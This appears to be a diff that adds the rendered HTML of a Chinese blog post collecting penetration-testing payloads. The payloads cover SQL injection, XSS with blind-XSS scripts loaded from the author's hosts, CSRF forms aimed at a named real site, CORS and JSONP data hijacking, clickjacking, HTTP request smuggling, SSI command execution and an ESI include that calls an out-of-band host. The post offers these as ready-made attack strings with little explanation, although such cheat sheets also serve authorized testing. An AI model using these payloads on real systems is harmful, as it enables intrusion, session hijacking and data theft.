@@ -1,37 +1,966 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SQLi12345678910111213141516模糊查询%&amp;#x27; and &amp;#x27;%&amp;#x27;&#x3D;&amp;#x27;%模糊查询%&amp;#x27;and&amp;#x27;%&amp;#x27;&#x3D;&amp;#x27;%if(now()&#x3D;sysdate(),sleep(10),0)&#x2F;*&amp;#x27;XOR(if(now()&#x3D;sysdate(),sleep(10),0))OR&amp;#x27;&quot;XOR(if(now()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【置顶】渗透测试Payload记录">
+<meta property="og:url" content="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="SQLi12345678910111213141516模糊查询%&amp;#x27; and &amp;#x27;%&amp;#x27;&#x3D;&amp;#x27;%模糊查询%&amp;#x27;and&amp;#x27;%&amp;#x27;&#x3D;&amp;#x27;%if(now()&#x3D;sysdate(),sleep(10),0)&#x2F;*&amp;#x27;XOR(if(now()&#x3D;sysdate(),sleep(10),0))OR&amp;#x27;&quot;XOR(if(now()">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/1566206867660.png">
+<meta property="og:image" content="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/1569678510656.png">
+<meta property="article:published_time" content="2022-08-19T11:37:52.000Z">
+<meta property="article:modified_time" content="2021-01-29T05:47:52.000Z">
+<meta property="article:author" content="laker">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/1566206867660.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2022/08/19/渗透测试Payload记录/"/>
+
+
+
+
+
+  <title>【置顶】渗透测试Payload记录 | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【置顶】渗透测试Payload记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-19T19:37:52+08:00">
+                2022-08-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">模糊查询</span><br><span class="line">%&#x27; and &#x27;%&#x27;=&#x27;%</span><br><span class="line"></span><br><span class="line">模糊查询</span><br><span class="line">%&#x27;and&#x27;%&#x27;=&#x27;%</span><br><span class="line"></span><br><span class="line">if(now()=sysdate(),sleep(10),0)/*&#x27;XOR(if(now()=sysdate(),sleep(10),0))OR&#x27;&quot;XOR(if(now()=sysdate(),sleep(10),0))OR&quot;*/</span><br><span class="line"></span><br><span class="line">放在GET类型：</span><br><span class="line">if(now()%3Dsysdate()%2Csleep(10)%2C0)%2f*&#x27;XOR(if(now()%3Dsysdate()%2Csleep(10)%2C0))OR&#x27;&quot;XOR(if(now()%3Dsysdate()%2Csleep(10)%2C0))OR&quot;*%2f%0A</span><br><span class="line"></span><br><span class="line">JSON:</span><br><span class="line">if(now()=sysdate(),sleep(10),0)/*&#x27;XOR(if(now()=sysdate(),sleep(10),0))OR&#x27;%22XOR(if(now()=sysdate(),sleep(10),0))OR%22*/</span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line">&#x27;%20AND%20(SELECT%203607%20FROM(SELECT%20COUNT(*),CONCAT(0x716b716271,(SELECT%20(ELT(3607=3607,1))),0x7171766271,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20AND%20&#x27;ycfF&#x27;=&#x27;ycfF</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>绕on事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x dur=1s&gt;</span><br><span class="line"></span><br><span class="line">XSS备忘录    https://zhuanlan.zhihu.com/p/98177600</span><br></pre></td></tr></table></figure>
+
+<p>​     n个事件   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/4109682.html">https://www.cnblogs.com/hookjoy/p/4109682.html</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">探针 &amp;&amp; 盲打</span><br><span class="line"><span class="tag">&lt;/<span class="name">tExtArEa</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">sCrIpt</span> <span class="attr">src</span>=<span class="string">https://xs.laker.top/s</span>&gt;</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">sCrIpt</span> <span class="attr">src</span>=<span class="string">https://xs.laker.top/s</span>&gt;</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line">data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMTExKT4=</span><br><span class="line"><span class="tag">&lt;/<span class="name">tExtArEa</span>&gt;</span>&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">sCRiPt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">sCrIpT</span>&gt;</span></span><br><span class="line">%3c/tExtArEa%3e&#x27;&quot;%3e%3cscript src=&quot;https://1e3.laker.top/myjs/1.js&quot;%3e%3c/script%3e</span><br></pre></td></tr></table></figure>
+
+<h4 id="DOM-XSS关键词（Burp）"><a href="#DOM-XSS关键词（Burp）" class="headerlink" title="DOM-XSS关键词（Burp）"></a>DOM-XSS关键词（Burp）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(?:location\.href)|(?:location\.search)|(?:location\.hash)|(?:location\.pathname)    # 从输入的关键词</span><br><span class="line"></span><br><span class="line">(?:document\.write\()|(?:innerHtml\()|(?:eval\()|(?:\.html\()|(?:\.append\()         # 从输出的关键词</span><br></pre></td></tr></table></figure>
+
+<p>较常用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(?:document\.write\()|(?:innerHtml\()|(?:eval\()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>无Referer:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://tjzb.newhealth.com.cn/personal/home&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;desktopIndex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https://baidu.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;mobileIndex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https://baidu.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;CSRF绕过&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>GET型：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://***&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">useUserInfo</span>(<span class="params">v</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  alert(v.username);</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.test.com/userinfo?callback=useUserInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">ws://echo.websocket.org/?encoding=text</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>echo.websocket.org</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://www.malicious.website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, sdch</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.8,zh-CN;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_gat=1; _ga=GA1.2.290430972.14547651; JSESSIONID=1A9431CF043F851E0356F5837845B2EC</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>7ARps0AjsHN8bx5dCI1KKQ==</span><br><span class="line"><span class="attribute">Sec-WebSocket-Extensions</span><span class="punctuation">: </span>permessage-deflate; client_max_window_bits</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95Payload%E8%AE%B0%E5%BD%95/1566206867660.png" alt="1566206867660"></p>
+<p>PS: <strong>跨域资源共享不适应于 WebSocket</strong>，WebSocket 没有明确规定跨域处理的方法。</p>
+<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>GET:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(xhr.responseText);</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://***&quot;</span>);</span></span><br><span class="line"><span class="javascript">    xhr.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>POST:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://www.jq22.com/jquery/jquery-3.3.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $.post(</span></span><br><span class="line"><span class="javascript">	&#123;</span></span><br><span class="line"><span class="javascript">		<span class="attr">type</span>: <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="javascript">		<span class="attr">url</span>: <span class="string">&quot;https://***&quot;</span>, </span></span><br><span class="line"><span class="javascript">		<span class="attr">contentType</span>: <span class="string">&quot;application/json; charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="javascript">		<span class="attr">xhrFields</span>: &#123;</span></span><br><span class="line"><span class="javascript">                      		<span class="attr">withCredentials</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="javascript">              		&#125;,</span></span><br><span class="line"><span class="javascript">		<span class="attr">crossDomain</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="javascript">		<span class="attr">data</span>: <span class="built_in">JSON</span>.stringify(</span></span><br><span class="line"><span class="javascript">			&#123;<span class="string">&quot;protocol&quot;</span>:&#123;<span class="string">&quot;fromPlatform&quot;</span>:<span class="string">&quot;venus_jquery_fnc_biz_web&quot;</span>,<span class="string">&quot;functionCode&quot;</span>:<span class="string">&quot;order_list&quot;</span>&#125;,<span class="string">&quot;param&quot;</span>:&#123;<span class="string">&quot;filter&quot;</span>:&#123;<span class="string">&quot;orderType&quot;</span>:<span class="string">&quot;all&quot;</span>,<span class="string">&quot;lastMonths&quot;</span>:<span class="number">0</span>,<span class="string">&quot;queryStartDate&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;queryEndDate&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;page&quot;</span>:<span class="number">1</span>,<span class="string">&quot;size&quot;</span>:<span class="number">8</span>&#125;&#125;</span></span><br><span class="line"><span class="javascript">		),</span></span><br><span class="line"><span class="javascript">		<span class="attr">success</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">						alert(<span class="string">&quot;hijack: &quot;</span> + <span class="built_in">JSON</span>.stringify(data));</span></span><br><span class="line"><span class="javascript">				&#125;,</span></span><br><span class="line"><span class="javascript">	&#125;</span></span><br><span class="line"><span class="javascript"> );</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>除此之外，利用SWF_JSON_CSRF的POC:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://www.0xby.com/swf_json_csrf/test.swf?endpoint=http://baidu.com/aaa/bb/test.do&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;&#x27;k1&#x27;:&#x27;v1&#x27;,&#x27;k2&#x27;:&#x27;v2&#x27;&#125;&amp;php_url=http://www.0xby.com/swf_json_csrf/test.php&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="CROS（-Access-Control-Allow-Origin-）绕过"><a href="#CROS（-Access-Control-Allow-Origin-）绕过" class="headerlink" title="CROS（ Access-Control-Allow-Origin: * ）绕过"></a>CROS（ Access-Control-Allow-Origin: * ）绕过</h2><p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/761726">https://hackerone.com/reports/761726</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">  </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url = <span class="string">&quot;https://keybase.io/_/api/1.0/user/lookup.json?username=&#123;YOUR_USERNAME&#125;&quot;</span>;  </span></span><br><span class="line"><span class="javascript">fetch(url, &#123;    </span></span><br><span class="line"><span class="javascript">    <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,    </span></span><br><span class="line"><span class="javascript">    <span class="attr">cache</span>: <span class="string">&#x27;force-cache&#x27;</span></span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Clickjacking"><a href="#Clickjacking" class="headerlink" title="Clickjacking"></a>Clickjacking</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Clickjacking<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://***&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h3><p>见POST参数修改path和host和指向目标</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>laker.top</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4181.9 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh,zh-CN;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- exec cmd=&quot;whoami&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ESI"><a href="#ESI" class="headerlink" title="ESI"></a>ESI</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">&quot;http://s5beqn.ceye.io&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
